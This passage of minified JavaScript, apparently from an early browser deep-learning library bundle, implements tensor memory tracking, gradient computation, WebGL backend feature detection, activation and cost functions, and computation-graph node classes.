e=this.refCounter.get(t.dataId);e<=1?(this.refCounter.delete(t.dataId),this.backend.disposeData(t.dataId),this.numDataBuffers--,this.numBytes-=h.sizeFromShape(t.shape)*h.bytesPerElement(t.dtype)):this.refCounter.set(t.dataId,e-1)}},t.prototype.memory=function(){var t=this.backend.memory();return t.numTensors=this.numTensors,t.numDataBuffers=this.numDataBuffers,t.numBytes=this.numBytes,t},t.prototype.shouldRecord=function(){return null!=this.activeTape&&0===this.customGradientDepth},t.prototype.addTapeNode=function(t,e,n){var r={};t.forEach((function(t,e){r[e]=t}));var i={id:this.nextTapeNodeId++,name:this.activeScope.name,inputs:r,output:e,gradient:function(t){var e=n(t),r={};return e.forEach((function(t,e){r[e]=function(){return t}})),r}};this.activeTape.push(i)},t.prototype.keep=function(t){if(1===this.scopeStack.length&&o.ENV.engine.safeMode)throw new Error("Safe mode is ON. Enclose all tensor operations inside dl.tidy(): dl.tidy(() => {...}) to avoid memory leaks.");return this.activeScope.keep.push(t),t},t.prototype.startScope=function(t,e){void 0===e&&(e=!1),e&&0===this.gradientScopeCount&&(this.activeTape=[]),e&&this.gradientScopeCount++;var n={keep:[],track:[]};t&&(n.name=t),this.scopeStack.push(n),this.activeScope=n},t.prototype.endScope=function(t,e){var n=this;void 0===e&&(e=!1),e&&(this.gradientScopeCount--,0===this.gradientScopeCount&&(this.activeTape=null));var r=this.activeScope.keep,i=h.extractTensorsFromContainer(t);r=r.concat(i);for(var o=0;o<this.activeScope.track.length;o++){var s=this.activeScope.track[o];h.isTensorInList(s,r)||(null!=this.activeTape?i.push(s):s.dispose())}this.scopeStack.pop(),this.activeScope=0===this.scopeStack.length?{keep:[],track:[]}:this.scopeStack[this.scopeStack.length-1],i.forEach((function(t){h.isTensorInList(t,n.activeScope.keep)||n.track(t)}))},t.prototype.dispose=function(){this.customBackend&&this.backend.dispose()},t.prototype.gradients=function(t,e,n,r){var i=this;return void 0===r&&(r=!1),h.assert(e.length>0,"gradients() received an empty list of xs."),s.tidy("gradients",(function(){var o=t();h.assert(o instanceof l.Tensor,"The result y returned by f() must be a tensor.");var s=c.getFilteredNodesXToY(i.activeTape,e,o);if(!r&&0===s.length&&e.length>0)throw new Error("Cannot compute gradient of y=f(x) with respect to x. Make sure that the f you passed encloses all operations that lead from x to y.");var u={};return u[o.id]=null==n?a.ones(o.shape):n,c.backpropagateGradients(u,s),{value:o,grads:e.map((function(t){return u[t.id]}))}}),!0)},t.prototype.customGrad=function(t){var e=this;return h.assert(h.isFunction(t),"The f passed in customGrad(f) must be a function."),function(){for(var n,r=[],i=0;i<arguments.length;i++)r[i]=arguments[i];h.assert(r.every((function(t){return t instanceof l.Tensor})),"The args passed in customGrad(f)(x1, x2,...) must all be tensors"),e.customGradientDepth++;var o=!0,a=s.tidy(t.name,(function(){var e=t.apply(void 0,r),i=e.value,o=e.gradFunc;return h.assert(i instanceof l.Tensor,"The function f passed in customGrad(f) must return an object where `obj.value` is a tensor"),h.assert(h.isFunction(o),"The function f passed in customGrad(f) must return an object where `obj.gradFunc` is a function."),n=o,i}),o);if(e.customGradientDepth--,e.shouldRecord()){var u=function(t){var e=n(t),i=Array.isArray(e)?e:[e];return h.assert(i.length===r.length,"The function f passed in customGrad(f) must return an object where `obj.gradFunc` is a function that returns the same number of tensors as inputs passed to f(...)."),h.assert(i.every((function(t){return t instanceof l.Tensor})),"The function f passed in customGrad(f) must return an object where `obj.gradFunc` is a function that returns a list of only tensors."),i};e.addTapeNode(r,a,u)}return a}},t.prototype.write=function(t,e){this.backend.write(t,e)},t.prototype.readSync=function(t){return this.backend.readSync(t)},t.prototype.read=function(t){return this.backend.read(t)},t.prototype.fromPixels=function(t,e){return this.backend.fromPixels(t,e)},t.prototype.time=function(t){return r(this,void 0,void 0,(function(){var e,n;return i(this,(function(r){switch(r.label){case 0:return e=performance.now(),[4,this.backend.time(t)];case 1:return(n=r.sent()).wallMs=performance.now()-e,[2,n]}}))}))},t.prototype.track=function(t){if(1===this.scopeStack.length&&this.safeMode)throw new Error("Safe mode is ON. Enclose all tensor operations inside dl.tidy(): dl.tidy(() => {op();...}); to avoid memory leaks.");return this.activeScope.track.push(t),t},t}();n.Engine=p},{"./environment":27,"./globals":28,"./ops/ops":114,"./profiler":135,"./tape":136,"./tensor":137,"./util":143}],27:[function(t,e,n){(function(e){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i,o=t("./device_util"),s=t("./doc"),a=t("./engine"),u=t("./math"),c=t("./util");function l(t,e){return null!=t.getExtension(e)}function h(t){if(0===t)throw new Error("Cannot get WebGL rendering context, WebGL is disabled.");var e=document.createElement("canvas");return 1===t?e.getContext("webgl")||e.getContext("experimental-webgl"):e.getContext("webgl2")}function p(t){if(null!=t){var e=t.getExtension("WEBGL_lose_context");if(null==e)throw new Error("Extension WEBGL_lose_context not supported on this browser.");e.loseContext()}}function d(t){var e=h(t);return null!=e&&(p(e),!0)}!function(t){t[t.NUMBER=0]="NUMBER",t[t.BOOLEAN=1]="BOOLEAN",t[t.STRING=2]="STRING"}(i=n.Type||(n.Type={})),n.URL_PROPERTIES=[{name:"DEBUG",type:i.BOOLEAN},{name:"WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION",type:i.NUMBER},{name:"WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_RELIABLE",type:i.BOOLEAN},{name:"WEBGL_VERSION",type:i.NUMBER},{name:"WEBGL_FLOAT_TEXTURE_ENABLED",type:i.BOOLEAN},{name:"WEBGL_GET_BUFFER_SUB_DATA_ASYNC_EXTENSION_ENABLED",type:i.BOOLEAN},{name:"BACKEND",type:i.STRING}];var f=["webgl","cpu"],y=function(){function t(t){this.features={},this.BACKEND_REGISTRY={},this.backends=this.BACKEND_REGISTRY,null!=t&&(this.features=t),this.get("DEBUG")&&console.warn("Debugging mode is ON. The output of every math call will be downloaded to CPU and checked for NaNs. This significantly impacts performance.")}return t.setBackend=function(t,e){if(void 0===e&&(e=!1),!(t in n.ENV.backends))throw new Error("Backend type '"+t+"' not found in registry");n.ENV.globalMath=new u.NDArrayMath(t,e)},t.getBackend=function(){return n.ENV.initEngine(),n.ENV.currentBackendType},t.memory=function(){return n.ENV.engine.memory()},t.prototype.get=function(t){return t in this.features||(this.features[t]=this.evaluateFeature(t)),this.features[t]},t.prototype.set=function(t,e){this.features[t]=e},t.prototype.getBestBackendType=function(){for(var t=0;t<f.length;++t){var e=f[t];if(e in this.backends)return e}throw new Error("No backend found in registry.")},t.prototype.evaluateFeature=function(t){if("DEBUG"===t)return!1;if("BACKEND"===t)return this.getBestBackendType();if("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION"===t){var e=this.get("WEBGL_VERSION");return 0===e?0:function(t){if(0===t)return 0;var e,n=h(t);return e=l(n,"EXT_disjoint_timer_query_webgl2")&&2===t?2:l(n,"EXT_disjoint_timer_query")?1:0,null!=n&&p(n),e}(e)}if("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_RELIABLE"===t)return this.get("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION")>0&&!o.isMobile();if("WEBGL_VERSION"===t)return d(2)?2:d(1)?1:0;if("WEBGL_FLOAT_TEXTURE_ENABLED"===t)return function(t){if(0===t)return!1;var e=h(t);if(1===t){if(!l(e,"OES_texture_float"))return!1}else if(!l(e,"EXT_color_buffer_float"))return!1;var n=e.createFramebuffer(),r=e.createTexture();e.bindTexture(e.TEXTURE_2D,r);var i=2===t?e.RGBA32F:e.RGBA;e.texImage2D(e.TEXTURE_2D,0,i,1,1,0,e.RGBA,e.FLOAT,null),e.bindFramebuffer(e.FRAMEBUFFER,n),e.framebufferTexture2D(e.FRAMEBUFFER,e.COLOR_ATTACHMENT0,e.TEXTURE_2D,r,0);var o=e.checkFramebufferStatus(e.FRAMEBUFFER)===e.FRAMEBUFFER_COMPLETE;e.readPixels(0,0,1,1,e.RGBA,e.FLOAT,new Float32Array(4));var s=e.getError()===e.NO_ERROR;return p(e),o&&s}(this.get("WEBGL_VERSION"));if("WEBGL_GET_BUFFER_SUB_DATA_ASYNC_EXTENSION_ENABLED"===t)return function(t){if(2!==t)return!1;var e=h(t),n=l(e,"WEBGL_get_buffer_sub_data_async");return p(e),n}(this.get("WEBGL_VERSION"));throw new Error("Unknown feature "+t+".")},t.prototype.setFeatures=function(t){this.reset(),this.features=t,this.backends={}},t.prototype.reset=function(){if(this.features=g(),null!=this.globalMath&&(this.globalMath.dispose(),this.globalMath=null,this.globalEngine=null),this.backends!==this.BACKEND_REGISTRY){for(var t in this.backends)this.backends[t].dispose();this.backends=this.BACKEND_REGISTRY}},t.prototype.setMath=function(t,e,r){if(void 0===r&&(r=!1),this.globalMath!==t){var i=!1;"string"==typeof e?(this.currentBackendType=e,e=n.ENV.findBackend(e)):(i=!0,this.currentBackendType="custom"),this.globalEngine=new a.Engine(e,i,r),this.globalMath=t}},t.prototype.findBackend=function(t){return this.backends[t]},t.prototype.addCustomBackend=function(t,e){if(t in this.backends)throw new Error(t+" backend was already registered");try{var n=e();return this.backends[t]=n,!0}catch(t){return!1}},t.prototype.registerBackend=function(t,e){if(t in this.BACKEND_REGISTRY)throw new Error(t+" backend was already registered as global");try{var n=e();return this.BACKEND_REGISTRY[t]=n,!0}catch(t){return!1}},Object.defineProperty(t.prototype,"math",{get:function(){return this.initEngine(),this.globalMath},enumerable:!0,configurable:!0}),Object.defineProperty(t.prototype,"engine",{get:function(){return this.initEngine(),this.globalEngine},enumerable:!0,configurable:!0}),t.prototype.initEngine=function(){null==this.globalEngine&&(this.globalMath=new u.NDArrayMath(n.ENV.get("BACKEND"),!1))},r([s.doc({heading:"Environment"})],t,"setBackend",null),r([s.doc({heading:"Environment"})],t,"getBackend",null),r([s.doc({heading:"Performance",subheading:"Memory"})],t,"memory",null),t}();n.Environment=y;var m,v="dljsflags";function g(){var t={};if("undefined"==typeof window)return t;var e=c.getQueryParams(window.location.search);if(v in e){var r={};e.dljsflags.split(",").forEach((function(t){var e=t.split(":"),n=e[0],i=e[1];r[n]=i})),n.URL_PROPERTIES.forEach((function(e){e.name in r&&(console.log("Setting feature override from URL "+e.name+": "+r[e.name]),e.type===i.NUMBER?t[e.name]=+r[e.name]:e.type===i.BOOLEAN?t[e.name]="true"===r[e.name]:e.type===i.STRING?t[e.name]=r[e.name]:console.warn("Unknown URL param: "+e.name+"."))}))}return t}n.ENV=((m=function(){var t;if("undefined"!=typeof window)t=window;else{if(void 0===e)throw new Error("Could not find a global object");t=e}return t}()).ENV=m.ENV||new y(g()),m.ENV)}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{"./device_util":24,"./doc":25,"./engine":26,"./math":96,"./util":143}],28:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("./gradients"),i=t("./tracking");n.tidy=i.Tracking.tidy,n.keep=i.Tracking.keep,n.dispose=i.Tracking.dispose,n.time=i.Tracking.time,n.grad=r.Gradients.grad,n.valueAndGrad=r.Gradients.valueAndGrad,n.grads=r.Gradients.grads,n.valueAndGrads=r.Gradients.valueAndGrads,n.variableGrads=r.Gradients.variableGrads,n.customGrad=r.Gradients.customGrad},{"./gradients":29,"./tracking":140}],29:[function(t,e,n){"use strict";var r=this&&this.__decorate||function(t,e,n,r){var i,o=arguments.length,s=o<3?e:null===r?r=Object.getOwnPropertyDescriptor(e,n):r;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(i=t[a])&&(s=(o<3?i(s):o>3?i(e,n,s):i(e,n))||s);return o>3&&s&&Object.defineProperty(e,n,s),s};Object.defineProperty(n,"__esModule",{value:!0});var i=t("./doc"),o=t("./environment"),s=t("./globals"),a=t("./tensor"),u=t("./util"),c=function(){function t(){}return t.gradScope=function(t,e){return s.tidy(t,e,!0)},t.grad=function(t){return u.assert(u.isFunction(t),"The f passed in grad(f) must be a function"),function(e,n){u.assert(e instanceof a.Tensor,"The x passed in grad(f)(x) must be a tensor"),u.assert(null==n||n instanceof a.Tensor,"The dy passed in grad(f)(x, dy) must be a tensor");var r=o.ENV.engine.gradients((function(){return t(e)}),[e],n),i=r.value,s=r.grads;return null!=n&&u.assertShapesMatch(i.shape,n.shape,"The shape of dy passed in grad(f)(x, dy) must match the shape returned by f(x)"),i.dispose(),l(s),s[0]}},t.grads=function(t){return u.assert(u.isFunction(t),"The f passed in grads(f) must be a function"),function(e,n){u.assert(Array.isArray(e)&&e.every((function(t){return t instanceof a.Tensor})),"The args passed in grads(f)(args) must be an array of tensors"),u.assert(null==n||n instanceof a.Tensor,"The dy passed in grads(f)(args, dy) must be a tensor");var r=o.ENV.engine.gradients((function(){return t.apply(void 0,e)}),e,n),i=r.value,s=r.grads;return null!=n&&u.assertShapesMatch(i.shape,n.shape,"The shape of dy passed in grads(f)([x1,...], dy) must match the shape returned by f([x1,...])"),i.dispose(),l(s),s}},t.valueAndGrad=function(t){return u.assert(u.isFunction(t),"The f passed in valueAndGrad(f) must be a function"),function(e,n){u.assert(e instanceof a.Tensor,"The x passed in valueAndGrad(f)(x) must be a tensor"),u.assert(null==n||n instanceof a.Tensor,"The dy passed in valueAndGrad(f)(x, dy) must be a tensor");var r=o.ENV.engine.gradients((function(){return t(e)}),[e],n),i=r.grads,s=r.value;return l(i),{grad:i[0],value:s}}},t.valueAndGrads=function(t){return u.assert(u.isFunction(t),"The f passed in valueAndGrads(f) must be a function"),function(e,n){u.assert(Array.isArray(e)&&e.every((function(t){return t instanceof a.Tensor})),"The args passed in valueAndGrads(f)(args) must be array of tensors"),u.assert(null==n||n instanceof a.Tensor,"The dy passed in valueAndGrads(f)(args, dy) must be a tensor");var r=o.ENV.engine.gradients((function(){return t.apply(void 0,e)}),e,n);return null!=n&&u.assertShapesMatch(r.value.shape,n.shape,"The shape of dy passed in valueAndGrads(f)([x1,...], dy) must match the shape returned by f([x1,...])"),l(r.grads),r}},t.variableGrads=function(t,e){if(u.assert(u.isFunction(t),"The f passed in variableGrads(f) must be a function"),u.assert(null==e||Array.isArray(e)&&e.every((function(t){return t instanceof a.Variable})),"The varList passed in variableGrads(f, varList) must be an array of variables"),null==e)for(var n in e=[],o.ENV.engine.registeredVariables)e.push(o.ENV.engine.registeredVariables[n]);var r=e.length;e=e.filter((function(t){return t.trainable})),u.assert(e.length>0,"variableGrads() expects at least one of the input variables to be trainable, but none of the "+r+" variables is trainable.");var i=o.ENV.engine.gradients(t,e,null,!0),s=i.value,c=i.grads;u.assert(c.some((function(t){return null!=t})),"Cannot find a connection between any variable and the result of the loss function y=f(x). Please make sure the operations that use variables are inside the function f passed to minimize()."),u.assert(0===s.rank,"The f passed in variableGrads(f) must return a scalar, but it returned a rank-"+s.rank+" tensor");var l={};return e.forEach((function(t,e){null!=c[e]&&(l[t.name]=c[e])})),{value:s,grads:l}},t.customGrad=function(t){return o.ENV.engine.customGrad(t)},r([i.doc({heading:"Training",subheading:"Gradients"})],t,"grad",null),r([i.doc({heading:"Training",subheading:"Gradients"})],t,"grads",null),r([i.doc({heading:"Training",subheading:"Gradients"})],t,"valueAndGrad",null),r([i.doc({heading:"Training",subheading:"Gradients"})],t,"valueAndGrads",null),r([i.doc({heading:"Training",subheading:"Gradients"})],t,"variableGrads",null),r([i.doc({heading:"Training",subheading:"Gradients"})],t,"customGrad",null),t}();function l(t){if(t.filter((function(t){return null==t})).length>0)throw new Error("Cannot compute gradient of y=f(x) with respect to x. Make sure that\n    the f you passed encloses all operations that lead from x to y.")}n.Gradients=c},{"./doc":25,"./environment":27,"./globals":28,"./tensor":137,"./util":143}],30:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../globals"),i=t("../tensor"),o=function(){function t(){this.one=i.Scalar.new(1)}return t.prototype.output=function(t,e){return t.tanh(e)},t.prototype.der=function(t,e,n){var i=this;return r.tidy((function(){var e=t.multiplyStrict(n,n);return t.subtract(i.one,e)}))},t.prototype.dispose=function(){this.one.dispose()},t}();n.TanHFunc=o;var s=function(){function t(){}return t.prototype.output=function(t,e){return t.relu(e)},t.prototype.der=function(t,e,n){return t.step(e)},t.prototype.dispose=function(){},t}();n.ReLUFunc=s;var a=function(){function t(t){this.alpha=t}return t.prototype.output=function(t,e){return t.leakyRelu(e,this.alpha)},t.prototype.der=function(t,e,n){return t.step(e,this.alpha)},t.prototype.dispose=function(){},t}();n.LeakyReluFunc=a;var u=function(){function t(){}return t.prototype.output=function(t,e){return t.sigmoid(e)},t.prototype.der=function(t,e,n){return r.tidy((function(){var e=t.multiplyStrict(n,n);return t.subStrict(n,e)}))},t.prototype.dispose=function(){},t}();n.SigmoidFunc=u;var c=function(){function t(){this.two=i.Scalar.new(2)}return t.prototype.output=function(t,e){return t.multiplyStrict(e,e)},t.prototype.der=function(t,e,n){return t.multiply(this.two,e)},t.prototype.dispose=function(){this.two.dispose()},t}();n.SquareFunc=c;var l=function(){function t(){}return t.prototype.output=function(t,e){return t.elu(e)},t.prototype.der=function(t,e,n){throw new Error("Not implemented")},t.prototype.dispose=function(){},t}();n.EluFunc=l},{"../globals":28,"../tensor":137}],31:[function(t,e,n){"use strict";Object.defineProperty(n,"__esModule",{value:!0});var r=t("../globals"),i=t("../ops/ops"),o=function(){function t(){this.halfOne=r.keep(i.scalar(.5))}return t.prototype.cost=function(t,e){var n=t.subStrict(e),r=n.square(),i=this.halfOne.mul(r);return n.dispose(),r.dispose(),i},t.prototype.der=function(t,e){return t.subStrict(e)},t.prototype.dispose=function(){this.halfOne.dispose()},t}();n.SquareCostFunc=o},{"../globals":28,"../ops/ops":114}],32:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(n,"__esModule",{value:!0});var o=t("../ops/concat_util"),s=t("../ops/conv_util"),a=t("../tensor"),u=t("../util"),c=t("./initializers"),l=function(){function t(t){this.g=t}return t.prototype.dense=function(t,e,n,r,i,o,s){void 0===r&&(r=null),void 0===i&&(i=!0),void 0===o&&(o=new c.VarianceScalingInitializer),void 0===s&&(s=new c.ZerosInitializer);var a=this.g.variable(t+"-weights",o.initialize([e.shape[0],n],e.shape[0],n)),u=this.g.matmul(e,a);if(i){var l=this.g.variable(t+"-bias",s.initialize([n],e.shape[0],n));u=this.g.add(u,l)}return null!=r&&(u=r(u)),u},t}();n.GraphLayers=l;var h=function(){function t(){this.nodes=[],this.layers=new l(this)}return t.prototype.variable=function(t,e){return this.addNodeAndReturnOutput(new f(this,t,e))},t.prototype.placeholder=function(t,e){return this.addNodeAndReturnOutput(new y(this,t,e))},t.prototype.constant=function(t){var e;if("number"==typeof t)e=a.Scalar.new(t);else if(t instanceof a.Tensor)e=t;else{if(!(t instanceof Array))throw new Error("unimplemented constant type.");var n=u.flatten(t),r=new Float32Array(n);e=a.Tensor.make(u.inferShape(t),{values:r})}return this.addNodeAndReturnOutput(new m(this,e))},t.prototype.reshape=function(t,e){return this.addNodeAndReturnOutput(new v(this,"Reshape",t,e))},t.prototype.fusedLinearCombination=function(t,e,n,r){return this.addNodeAndReturnOutput(new g(this,t,e,n,r))},t.prototype.add=function(t,e){return this.addNodeAndReturnOutput(new _(this,t,e))},t.prototype.subtract=function(t,e){return this.addNodeAndReturnOutput(new b(this,t,e))},t.prototype.multiply=function(t,e){return this.addNodeAndReturnOutput(new w(this,t,e))},t.prototype.divide=function(t,e){return this.addNodeAndReturnOutput(new x(this,t,e))},t.prototype.reduceSum=function(t){return this.addNodeAndReturnOutput(new T(this,t))},t.prototype.concat1d=function(t,e){return this.addNodeAndReturnOutput(new S(this,t,e))},t.prototype.concat2d=function(t,e,n){return this.addNodeAndReturnOutput(new O(this,t,e,n))},t.prototype.concat3d=function(t,e,n){return this.addNodeAndReturnOutput(new E(this,t,e,n))},t.prototype.concat4d=function(t,e,n){return this.addNodeAndReturnOutput(new A(this,t,e,n))},t.prototype.matmul=function(t,e){return this.addNodeAndReturnOutput(new k(this,t,e))},t.prototype.conv2d=function(t,e,n,r,i,o,s){return void 0===o&&(o=1),this.addNodeAndReturnOutput(new P(this,t,e,n,r,i,o,s))},t.prototype.maxPool=function(t,e,n,r){return void 0===n&&(n=1),this.addNodeAndReturnOutput(new M(this,t,e,n,r))},t.prototype.exp=function(t){return this.addNodeAndReturnOutput(new D(this,t))},t.prototype.log=function(t){return this.addNodeAndReturnOutput(new I(this,t))},t.prototype.relu=function(t){return this.addNodeAndReturnOutput(new C(this,t))},t.prototype.leakyRelu=function(t,e){return this.addNodeAndReturnOutput(new N(this,t,e))},t.prototype.prelu=function(t,e){return this.addNodeAndReturnOutput(new R(this,t,e))},t.prototype.elu=function(t){return this.addNodeAndReturnOutput(new F(this,t))},t.prototype.tanh=function(t){return this.addNodeAndReturnOutput(new B(this,t))},t.prototype.sigmoid=function(t){return this.addNodeAndReturnOutput(new q(this,t))},t.prototype.square=function(t){return this.addNodeAndReturnOutput(new L(this,t))},t.prototype.softmax=function(t){return this.addNodeAndReturnOutput(new V(this,t))},t.prototype.softmaxCrossEntropyCost=function(t,e){return this.addNodeAndReturnOutput(new z(this,t,e))},t.prototype.meanSquaredCost=function(t,e){return this.addNodeAndReturnOutput(new j(this,t,e))},t.prototype.argmax=function(t){return this.addNodeAndReturnOutput(new U(this,t))},t.prototype.argmaxEquals=function(t,e){return this.addNodeAndReturnOutput(new G(this,t,e))},t.prototype.addNodeAndReturnOutput=function(t){return this.nodes.push(t),t.validate(),t.output},t.prototype.getNodes=function(){return this.nodes},t}();n.Graph=h;var p=function(t){function e(n){var r=t.call(this,[],"float32")||this;return r.shape=n,r.id=e.nextID++,r}return i(e,t),e.nextID=0,e}(a.Tensor);n.SymbolicTensor=p;var d=function(){function t(e,n,r,i){this.graph=e,this.name=n,this.inputs=r,this.output=i,this.id=t.nextID++,i.node=this}return t.nextID=0,t}();n.Node=d;var f=function(t){function e(e,n,r){var i=t.call(this,e,n,{},new p(r.shape))||this;return i.data=r,i}return i(e,t),e.prototype.validate=function(){u.assert(null!=this.data,"Error adding variable op: Data for variable '"+this.name+"' is null or undefined")},e}(d);n.VariableNode=f;var y=function(t){function e(e,n,r){return t.call(this,e,n,{},new p(r))||this}return i(e,t),e.prototype.validate=function(){},e}(d);n.PlaceholderNode=y;var m=function(t){function e(e,n){var r=t.call(this,e,"Constant",{},new p(n.shape))||this;return r.data=n,r}return i(e,t),e.prototype.validate=function(){u.assert(null!=this.data,"Error adding constant: data for placeholder '"+this.name+"' is null or undefined")},e}(d);n.ConstantNode=m;var v=function(t){function e(e,n,r,i){var o=t.call(this,e,n,{x:r},new p(i))||this;return o.name=n,o.x=r,o.shape=i,o}return i(e,t),e.prototype.validate=function(){var t=u.sizeFromShape(this.x.shape),e=u.sizeFromShape(this.shape);u.assert(t===e,"Error making reshape operation: input to reshape '"+this.name+"' of shape ("+this.x.shape+") does not match size of requested shape "+this.shape+".")},e.X="x",e}(d);n.ReshapeNode=v;var g=function(t){function e(e,n,r,i,o){var s=t.call(this,e,"Linear Combination",{t1:n,t2:r,c1:i,c2:o},new p(n.shape))||this;return s.t1=n,s.t2=r,s.c1=i,s.c2=o,s}return i(e,t),e.prototype.validate=function(){if(u.assertShapesMatch(this.t1.shape,this.t2.shape),!u.isScalarShape(this.c1.shape))throw new Error("Error adding fusedLinearCombination: c1 is not a scalar, got shape: "+this.c1.shape);if(!u.isScalarShape(this.c2.shape))throw new Error("Error adding fusedLinearCombination: c2 is not a scalar, got shape: "+this.c2.shape)},e.T1="t1",e.T2="t2",e.C1="c1",e.C2="c2",e}(d);n.FusedLinearCombinationNode=g;var _=function(t){function e(e,n,r){var i=t.call(this,e,"Add",{t1:n,t2:r},new p(1===u.sizeFromShape(n.shape)||n.shape.length<r.shape.length?r.shape:n.shape))||this;return i.t1=n,i.t2=r,i}return i(e,t),e.prototype.validate=function(){u.assert(1===u.sizeFromShape(this.t1.shape)||1===u.sizeFromShape(this.t2.shape)||u.arraysEqual(this.t1.shape,this.t2.shape)||2===this.t1.shape.length&&1===this.t2.shape.length&&this.t1.shape[1]===this.t2.shape[0]||1===this.t1.shape.length&&2===this.t2.shape.length&&this.t1.shape[0]===this.t2.shape[1],"Error adding add operation op: one of inputs must be scalar, shapes "+this.t1.shape+" and "+this.t2.shape+" must match,or one of them can be broadcasted (2D and 1D).")},e.T1="t1",e.T2="t2",e}(d);n.AddNode=_;var b=function(t){function e(e,n,r){var i=t.call(this,e,"Subtract",{t1:n,t2:r},new p(1===u.sizeFromShape(n.shape)?r.shape:n.shape))||this;return i.t1=n,i.t2=r,i}return i(e,t),e.prototype.validate=function(){u.assert(1===u.sizeFromShape(this.t1.shape)||1===u.sizeFromShape(this.t2.shape)||u.arraysEqual(this.t1.shape,this.t2.shape),"Error adding subtract op: one of inputs must be scalar or the shapes "+this.t1.shape+" and "+this.t2.shape+" must match.")},e.T1="t1",e.T2="t2",e}(d);n.SubtractNode=b;var w=function(t){function e(e,n,r){var i=t.call(this,e,"Multiply",{t1:n,t2:r},new p(1===u.sizeFromShape(n.shape)?r.shape:n.shape))||this;return i.t1=n,i.t2=r,i}return i(e,t),e.prototype.validate=function(){u.assert(1===u.sizeFromShape(this.t1.shape)||1===u.sizeFromShape(this.t2.shape)||u.arraysEqual(this.t1.shape,this.t2.shape),"Error adding multiply op: one of inputs must be scalar or the shapes "+this.t1.shape+" and "+this.t2.shape+" must match.")},e.T1="t1",e.T2="t2",e}(d);n.MultiplyNode=w;var x=function(t){function e(e,n,r){var i=t.call(this,e,"Divide",{t1:n,t2:r},new p(1===u.sizeFromShape(n.shape)?r.shape:n.shape))||this;return i.t1=n,i.t2=r,i}return i(e,t),e.prototype.validate=function(){u.assert(1===u.sizeFromShape(this.t1.shape)||1===u.sizeFromShape(this.t2.shape)||u.arraysEqual(this.t1.shape,this.t2.shape),"Error adding divide op: one of inputs must be scalar or the shapes "+this.t1.shape+" and "+this.t2.shape+" must match.")},e.T1="t1",e.T2="t2",e}(d);n.DivideNode=x;var T=function(t){function e(e,n){return t.call(this,e,"ReduceSum",{x:n},new p([]))||this}return i(e,t),e.prototype.validate=function(){},e.X="x",e}(d);n.ReduceSumNode=T;var S=function(t){function e(e,n,r){return t.call(this,e,"Concat1D",{x1:n,x2:r},new p(o.computeOutShape1D(n.shape,r.shape)))||this}return i(e,t),e.prototype.validate=function(){},e.X1="x1",e.X2="x2",e}(d);n.Concat1DNode=S;var O=function(t){function e(e,n,r,i){var s=t.call(this,e,"Concat2D",{x1:n,x2:r},new p(o.computeOutShape(n.shape,r.shape,i)))||this;return s.x1=n,s.x2=r,s.axis=i,s}return i(e,t),e.prototype.validate=function(){o.assertParams(this.x1.shape,this.x2.shape,this.axis)},e.X1="x1",e.X2="x2",e.AXIS="axis",e}(d);n.Concat2DNode=O;var E=function(t){function e(e,n,r,i){var s=t.call(this,e,"Concat3D",{x1:n,x2:r},new p(o.computeOutShape(n.shape,r.shape,i)))||this;return s.x1=n,s.x2=r,s.axis=i,s}return i(e,t),e.prototype.validate=function(){o.assertParams(this.x1.shape,this.x2.shape,this.axis)},e.X1="x1",e.X2="x2",e.AXIS="axis",e}(d);n.Concat3DNode=E;var A=function(t){function e(e,n,r,i){var s=t.call(this,e,"Concat4D",{x1:n,x2:r},new p(o.computeOutShape(n.shape,r.shape,i)))||this;return s.x1=n,s.x2=r,s.axis=i,s}return i(e,t),e.prototype.validate=function(){o.assertParams(this.x1.shape,this.x2.shape,this.axis)},e.X1="x1",e.X2="x2",e.AXIS="axis",e}(d);n.Concat4DNode=A;var k=function(t){function e(e,n,r){var i,o,s=t.call(this,e,"MatMul",{x1:n,x2:r},new p((i=n.shape,o=r.shape,1===i.length&&1===o.length?[1]:1===i.length&&2===o.length?[o[1]]:2===i.length&&1===o.length?[i[0]]:[i[0],o[1]])))||this;return s.x1=n,s.x2=r,s}return i(e,t),e.prototype.validate=function(){if(2===this.x1.shape.length&&2===this.x2.shape.length)u.assert(this.x1.shape[1]===this.x2.shape[0],"Error adding matmul op: inner shapes of matrices with shapes "+this.x1.shape+" and "+this.x2.shape+" must match.");else if(2===this.x1.shape.length&&1===this.x2.shape.length)u.assert(this.x1.shape[1]===this.x2.shape[0],"Error adding matmul op: second dimension of matrix with shape "+this.x1.shape.toString()+" must match size of vector with shape "+this.x2.shape+".");else{if(1!==this.x1.shape.length||2!==this.x2.shape.length)throw new Error("Error adding matmul op: inputs must be vectors or matrices.");u.assert(this.x1.shape[0]===this.x2.shape[0],"Error adding matmul op: size of vector with shape "+this.x1.shape+" must match first dimension of matrix with shape "+this.x2.shape+".")}},e.X1="x1",e.X2="x2",e}(d);n.MatMulNode=k;var P=function(t){function e(e,n,r,i,o,a,u,c){void 0===u&&(u=1);var l=t.call(this,e,"Convolution 2D",{x:n,w:r,b:i},new p(s.computeOutputShape3D(n.shape,o,a,u,c)))||this;return l.x=n,l.w=r,l.b=i,l.fieldSize=o,l.outputDepth=a,l.stride=u,l.zeroPad=c,l}return 